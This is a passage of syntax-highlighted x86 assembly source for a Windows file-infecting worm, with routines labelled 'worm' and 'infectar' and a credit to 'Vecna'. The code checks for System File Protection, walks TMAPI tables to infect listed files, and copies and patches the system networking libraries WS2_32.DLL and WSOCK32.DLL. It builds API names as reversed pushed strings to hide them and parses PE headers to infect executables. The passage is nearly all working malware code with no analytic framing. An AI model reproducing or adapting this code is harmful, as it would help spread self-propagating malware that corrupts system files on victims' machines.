   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_InternetGetConnectedState</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inet@002</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">download</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;  done ?</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inet@002</span><span class="sc0">

   </span><span class="sc1">;  NET HERE</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">inet@002</span><span class="sc0">

   </span><span class="sc5">inet@error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">inet@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WININET</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">inet@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WININET</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">

   </span><span class="sc5">inet@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">worm@001</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

   </span><span class="sc5">worm@002</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sfc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sfc_not_found</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'.CFS'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sfc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sfc_not_found</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'de'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tcet'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'orPe'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'liFs'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'IcfS'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sfc</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SfcIsFileProtected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sfc_not_found</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sfc</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">

   </span><span class="sc5">sfc_not_found</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; let's try to infect filez via TMAPI.DLL   (c)Vecna</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">system@001</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LD.I'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'PAMT'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmapix</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'elb'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'aTmT'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tinI'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmapix</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InitTmTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'xed'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'nIyB'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tnem'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'elEm'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'TteG'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmapix</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetTmElementByIndex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'elba'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'TmTe'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'solC'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmapix</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseTmTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InitTmTable</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">procura@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetTmElementByIndex</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infectar@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">procura@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseTmTable</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm@003</span><span class="sc0">

   </span><span class="sc5">worm@002</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

   </span><span class="sc5">worm@003</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmapix</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_unload</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tmapix</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">

   </span><span class="sc5">no_unload</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">system@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetSystemDirectoryA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'.23_'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc13">'2SW\'
</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@004</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wsock32@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm@004</span><span class="sc0">   </span><span class="sc1">;   WS2_32.DLL is infected, we don't</span><span class="sc0">
                  </span><span class="sc1">;   need WSOCK32.DLL</span><span class="sc0">
   </span><span class="sc5">wsock32@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetSystemDirectoryA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'23KC'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc13">'OSW\'
</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wsock32@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm@004</span><span class="sc0">

   </span><span class="sc5">wsock32@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tce'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'nnoc'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'SII'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SII'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CAN I TRY TO INFECT THIS FILE ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wsock32@005</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@006</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@006</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_buffer@006</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'---.'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CopyFileA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@006</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IO@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ntpe</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@004</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   number of sections</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
